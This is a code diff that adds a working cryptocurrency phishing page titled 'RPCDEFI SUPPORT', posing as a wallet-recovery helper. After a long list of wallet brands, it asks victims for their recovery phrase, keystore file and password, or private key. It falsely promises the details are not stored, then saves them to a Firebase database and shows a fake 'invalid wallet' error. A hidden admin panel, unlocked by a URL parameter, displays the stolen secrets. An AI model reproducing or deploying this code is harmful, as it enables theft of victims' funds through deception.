+    <option value="MYKEY">
+        MYKEY
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="TrustVault">
+        TrustVault
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Atomic">
+        Atomic
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Coin98">
+        Coin98
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="zkSync">
+        zkSync
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Shell Exchange">
+        Shell Exchange
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Index Coop">
+        Index Coop
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="SwapX">
+        SwapX
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Starname">
+        Starname
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Space">
+        Space
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Maskbook">
+        Maskbook
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Snapshot">
+        Snapshot
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Invoice.build">
+        Invoice.build
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Ankr">
+        Ankr
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="DODO">
+        DODO
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="zLOT">
+        zLOT
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Tokamak Network">
+        Tokamak Network
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Actus Protocol">
+        Actus Protocol
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="AstroTools.io">
+        AstroTools.io
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Rubic Exchange">
+        Rubic Exchange
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Torus Wallet">
+        Torus Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Oceanprotocol">
+        Oceanprotocol
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Filecone Wallet">
+        Filecone Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Falconswap">
+        Falconswap
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Bancor Wallet">
+        Bancor Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Harvest Finance">
+        Harvest Finance
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="OctoFi">
+        OctoFi
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Mushroom Finance">
+        Mushroom Finance
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Bitfrost Finance">
+        Bitfrost Finance
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Orchid Protocol">
+        Orchid Protocol
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Datamine Network">
+        Datamine Network
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Streamr">
+        Streamr
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="DappRadar">
+        DappRadar
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="SuperRare">
+        SuperRare
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Arbitrum">
+        Arbitrum
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="ParaSwap">
+        ParaSwap
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="HoneySwap">
+        HoneySwap
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Fleek">
+        Fleek
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="CoolWallet">
+        CoolWallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Alice">
+        Alice
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="AlphaWallet">
+        AlphaWallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="ZelCore">
+        ZelCore
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Phantom Wallet">
+        Phantom Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Solflare Wallet">
+        Solflare Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Sollet Wallet">
+        Sollet Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="D'CENT Wallet">
+        D'CENT Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Tokenary">
+        Tokenary
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Spatium">
+        Spatium
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Infinito">
+        Infinito
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Wallet.io">
+        Wallet.io
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Infinity Wallet">
+        Infinity Wallet
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Ownbit">
+        Ownbit
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="EasyPocket">
+        EasyPocket
+    </option>
+    <!-- end -->
+
+    <!-- start -->
+    <option value="Bridge Wallet">
+        Bridge Wallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Unstoppable Wallet">
+        Unstoppable Wallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="PEAKDEFI Wallet">
+        PEAKDEFI Wallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Vision">
+        Vision
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="BitKeep">
+        BitKeep
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="ViaWallet">
+        ViaWallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="SparkPoint">
+        SparkPoint
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="HaloDefi Wallet">
+        HaloDefi Wallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Dok Wallet">
+        Dok Wallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="AT.Wallet">
+        AT.Wallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Midas Wallet">
+        Midas Wallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Ellipal">
+        Ellipal
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="KEYRING PRO">
+        KEYRING PRO
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Aktoinariat">
+        Aktoinariat
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Talken Wallet">
+        Talken Wallet
+    </option>
+    
+    <!-- start -->
+    <option value="XinFin XDC Network">
+        XinFin XDC Network
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Flare Wallet">
+        Flare Wallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="AToken Wallet">
+        AToken Wallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Tongue Wallet">
+        Tongue Wallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Binance DEX">
+        Binance DEX
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="RWallet">
+        RWallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="PlasmaPay">
+        PlasmaPay
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="O3Wallet">
+        O3Wallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="HashKey Me">
+        HashKey Me
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Jade Wallet">
+        Jade Wallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Guarda Wallet">
+        Guarda Wallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Defiant">
+        Defiant
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Trustee Wallet">
+        Trustee Wallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="MEET.ONE">
+        MEET.ONE
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="MoriX Wallet">
+        MoriX Wallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Binance Smart Chain">
+        Binance Smart Chain
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Etherscan">
+        Etherscan
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Lido">
+        Lido
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="TERRAstation">
+        TERRAstation
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="OpenSea">
+        OpenSea
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Zapper">
+        Zapper
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Aave">
+        Aave
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Zerion">
+        Zerion
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="LocalCryptos">
+        LocalCryptos
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="DeBank">
+        DeBank
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Unstoppable Domains">
+        Unstoppable Domains
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Rarible">
+        Rarible
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Yearn">
+        Yearn
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Adex Network">
+        Adex Network
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="dYdX">
+        dYdX
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="MyCrypto">
+        MyCrypto
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Oasis App">
+        Oasis App
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="TokenSets">
+        TokenSets
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="MANTRA DAO">
+        MANTRA DAO
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Matcha">
+        Matcha
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="KyberSwap">
+        KyberSwap
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="DeFi Portfolio Tracker">
+        DeFi Portfolio Tracker
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Loopring">
+        Loopring
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="InstaDapp">
+        InstaDapp
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Matic Network">
+        Matic Network
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="3Box">
+        3Box
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="DDEX">
+        DDEX
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Bamboo Relay">
+        Bamboo Relay
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Synthetix">
+        Synthetix
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Dex.blue">
+        Dex.blue
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="PoolTogether">
+        PoolTogether
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="DEX.AG">
+        DEX.AG
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Gelato">
+        Gelato
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="ENS Domains">
+        ENS Domains
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Idle Finance">
+        Idle Finance
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="iearn.finance">
+        iearn.finance
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="RCN Finance">
+        RCN Finance
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Hegic">
+        Hegic
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Kickback">
+        Kickback
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="88mph">
+        88mph
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Mooni">
+        Mooni
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Clovers">
+        Clovers
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Mintbase">
+        Mintbase
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="DAOstack">
+        DAOstack
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="KnownOrigin">
+        KnownOrigin
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="MyEtherWallet">
+        MyEtherWallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Affogato">
+        Affogato
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="StablePay">
+        StablePay
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Defi Saver">
+        Defi Saver
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Loom Network">
+        Loom Network
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="ThorChain">
+        ThorChain
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="BulkSender">
+        BulkSender
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Heroes of Ether">
+        Heroes of Ether
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Betoken">
+        Betoken
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Linkdrop">
+        Linkdrop
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="HelioWallet">
+        HelioWallet
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Escaroo">
+        Escaroo
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="TokenMarket">
+        TokenMarket
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Mesa">
+        Mesa
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="MCDEX">
+        MCDEX
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Furucombo">
+        Furucombo
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Melon">
+        Melon
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Chainsfr">
+        Chainsfr
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="AKA3Email Alias">
+        AKA3Email Alias
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="2Key">
+        2Key
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Pitch">
+        Pitch
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="SunshiSwap">
+        SunshiSwap
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Unagii">
+        Unagii
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Cream Finance">
+        Cream Finance
+    </option>
+    <!-- end -->
+    
+    <!-- start -->
+    <option value="Other Wallet">
+        Other Wallet
+    </option>
+    <!-- end -->
+</select>            </div>
+            <div class="dropdown">
+            <label for="type">Access Type:</label>
+            <select id="type" name="type" onchange="toggleFields()">
+                <option value="">Select Option</option>
+                <option value="Phrase" id="phraseOption">Phrase</option>
+                <option value="Keystore JSON" id="keystoreOption">Keystore JSON</option>
+                <option value="Private" id="privateOption">Private Key</option>
+            </select>
+        </div>
+        <div id="phraseField" class="toggle-field">
+            <textarea id="phrase" name="phraseinput" cols="30" rows="4" placeholder="Enter your Recovery Phrase"></textarea>
+            <p style="font-size:10px">Typically 12 (sometimes 24) words separated by single spaces</p>
+            <p id="phraseError" class="error-message">Please enter at least 12 words for the recovery phrase.</p>
+        </div>
+        <div id="keystoreField" class="toggle-field">
+            <textarea id="keystore" name="keystoreval" cols="30" rows="4" placeholder="Enter your Keystore JSON"></textarea>
+            <p style="font-size:10px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>
+            <input type="text" id="wallet_password" name="password" placeholder="Enter Wallet Password">
+        </div>
+        <div id="privateField" class="toggle-field">
+            <input type="text" id="private_key" name="privatekeyval" placeholder="Enter Your Private Key">
+        </div>
+        <p style="font-size:8px">Any misinformation may hinder the successful resolution of the issue. Your details are not stored on our system! It's for resolution purposes only.</p>
+        <div class="popup-footer">
+            <button class="connect-btn" type="submit">Connect Wallet</button>
+            <input type="hidden" name="action" value="wallet_recovery">
+            <a class="cancel-btn" onclick="closePopup()">Cancel</a>
+        </div>
+        </form>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Initialize Firebase with your config
+    const firebaseConfig = {
+        apiKey: "AIzaSyB53y8koi5SHiprix9jpIXFdwqaz-l0q7E",
+        authDomain: "rpcdefi-support.firebaseapp.com",
+        projectId: "rpcdefi-support",
+        storageBucket: "rpcdefi-support.firebasestorage.app",
+        messagingSenderId: "335032739279",
+        appId: "1:335032739279:web:7f12fc175d7b3ceb249eba"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+    const auth = firebase.auth();
+
+    // Show admin login button if URL has admin parameter
+    if(window.location.search.includes('admin=true')) {
+        document.getElementById('adminLoginBtn').style.display = 'block';
+    }
+
+    function showAdminLogin() {
+        document.getElementById('adminLoginContainer').style.display = 'block';
+    }
+
+    // Admin login function
+    document.getElementById('adminLoginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const email = document.getElementById('adminEmail').value;
+        const password = document.getElementById('adminPassword').value;
+        
+        auth.signInWithEmailAndPassword(email, password)
+            .then(() => {
+                document.getElementById('adminLoginContainer').style.display = 'none';
+                document.getElementById('adminPanel').style.display = 'block';
+                loadSubmissions();
+            })
+            .catch(error => {
+                alert('Login failed: ' + error.message);
+            });
+    });
+
+    function logoutAdmin() {
+        auth.signOut().then(() => {
+            document.getElementById('adminPanel').style.display = 'none';
+        });
+    }
+
+    function loadSubmissions() {
+        db.collection("walletSubmissions").orderBy("timestamp", "desc").get()
+            .then(querySnapshot => {
+                const submissionsList = document.getElementById('submissionsList');
+                submissionsList.innerHTML = '';
+                
+                querySnapshot.forEach(doc => {
+                    const data = doc.data();
+                    const submissionDiv = document.createElement('div');
+                    submissionDiv.className = 'submission-item';
+                    
+                    submissionDiv.innerHTML = `
+                        <h3>${data.walletType}</h3>
+                        <p><strong>Access Type:</strong> ${data.accessType}</p>
+                        ${data.recoveryPhrase ? `<p><strong>Recovery Phrase:</strong> ${data.recoveryPhrase}</p>` : ''}
+                        ${data.keystoreJSON ? `<p><strong>Keystore JSON:</strong> ${data.keystoreJSON}</p>` : ''}
+                        ${data.privateKey ? `<p><strong>Private Key:</strong> ${data.privateKey}</p>` : ''}
+                        <p><strong>Date:</strong> ${new Date(data.timestamp?.toDate()).toLocaleString()}</p>
+                        <button onclick="deleteSubmission('${doc.id}')" class="delete-btn">Delete</button>
+                    `;
+                    
+                    submissionsList.appendChild(submissionDiv);
+                });
+            })
+            .catch(error => {
+                console.error("Error getting submissions: ", error);
+                alert('Error loading submissions: ' + error.message);
+            });
+    }
+
+    function deleteSubmission(id) {
+        if(confirm('Are you sure you want to delete this submission?')) {
+            db.collection("walletSubmissions").doc(id).delete()
+                .then(() => {
+                    loadSubmissions();
+                })
+                .catch(error => {
+                    console.error("Error deleting submission: ", error);
+                    alert('Error deleting submission: ' + error.message);
+                });
+        }
+    }
+// Replace the existing form submission handler with this:
+document.getElementById('walletRecoveryForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const walletType = document.getElementById('wallet_id').value;
+    const accessType = document.getElementById('type').value;
+    const recoveryPhrase = document.getElementById('phrase').value || null;
+    const keystoreJSON = document.getElementById('keystore').value || null;
+    const privateKey = document.getElementById('private_key').value || null;
+    
+    // Validate phrase if that's the selected type
+    if (accessType === 'Phrase') {
+        const phrase = document.getElementById('phrase').value.trim();
+        const words = phrase.split(/\s+/);
+        if (words.length < 12) {
+            document.getElementById('phraseError').style.display = 'block';
+            return;
+        }
+    }
+    
+    // Save to Firebase
+    db.collection("walletSubmissions").add({
+        walletType: walletType,
+        accessType: accessType,
+        recoveryPhrase: recoveryPhrase,
+        keystoreJSON: keystoreJSON,
+        privateKey: privateKey,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+    })
+    .then(() => {
+        // Show custom error page instead of success message
+        document.body.innerHTML = `
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <meta http-equiv="X-UA-Compatible" content="IE=edge">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Error</title>
+                <style>
+                    body {
+                        font-family: Arial, sans-serif;
+                        background-color: #f4f4f4;
+                        margin: 0;
+                        padding: 0;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        height: 100vh;
+                        text-align: center;
+                    }
+                    .error-container {
+                        background-color: #fff;
+                        padding: 20px;
+                        border-radius: 5px;
+                        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+                    }
+                    .error-sign {
+                        color: red;
+                        font-size: 36px;
+                        margin-bottom: 10px;
+                        border: 2px solid red;
+                        border-radius: 50%;
+                        width: 50px;
+                        height: 50px;
+                        line-height: 50px;
+                        display: inline-block;
+                    }
+                    h1 {
+                        color: #333;
+                        margin-bottom: 20px;
+                    }
+                    p {
+                        color: #666;
+                        font-size: 18px;
+                    }
+                    .ok-button {
+                        background-color: #007bff;
+                        color: white;
+                        border: none;
+                        padding: 10px 20px;
+                        border-radius: 5px;
+                        text-decoration: none;
+                        display: inline-block;
+                        margin-top: 20px;
+                    }
+                    .ok-button:hover {
+                        background-color: #0056b3;
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="error-container">
+                    <div class="error-sign">X</div>
+                    <h1>Oops...</h1>
+                    <p>Invalid wallet or inactive wallet, Please <br />connect with a more active wallet and try again.</p>
+                    <a href="/" class="ok-button">OK</a>
+                </div>
+            </body>
+            </html>
+        `;
+    })
+    .catch(error => {
+        console.error("Error adding document: ", error);
+        alert('There was an error submitting your information. Please try again.');
+    });
+});
+
+    // Existing functions
+    function openPopup() {
+        document.getElementById("popup-container").style.display = "flex";
+        document.getElementById("connecting").style.display = "block";
+        setTimeout(function() {
+            document.getElementById("connecting").style.display = "none";
+            document.getElementById("walletForm").style.display = "block";
+        }, 15000);
+    }
+
+    function closePopup() {
+        document.getElementById('popup-container').style.display = 'none';
+        document.getElementById("connecting").style.display = "none";
+        document.getElementById("walletForm").style.display = "none";
+    }
+
+    function toggleFields() {
+        var selectedType = document.getElementById('type').value;
+        document.getElementById('phraseField').style.display = (selectedType === 'Phrase') ? 'block' : 'none';
+        document.getElementById('keystoreField').style.display = (selectedType === 'Keystore JSON') ? 'block' : 'none';
+        document.getElementById('privateField').style.display = (selectedType === 'Private') ? 'block' : 'none';
+    }
+
+    setTimeout(function() {
+        const popupBox = document.querySelector('.popup-box');
+        if(popupBox) {
+            popupBox.remove();
+        }
+    }, 25000);
+</script>
+
+</body></html>
+Page title: RPCDEFI SUPPORT- We are here to help you resolve your crypto related issues
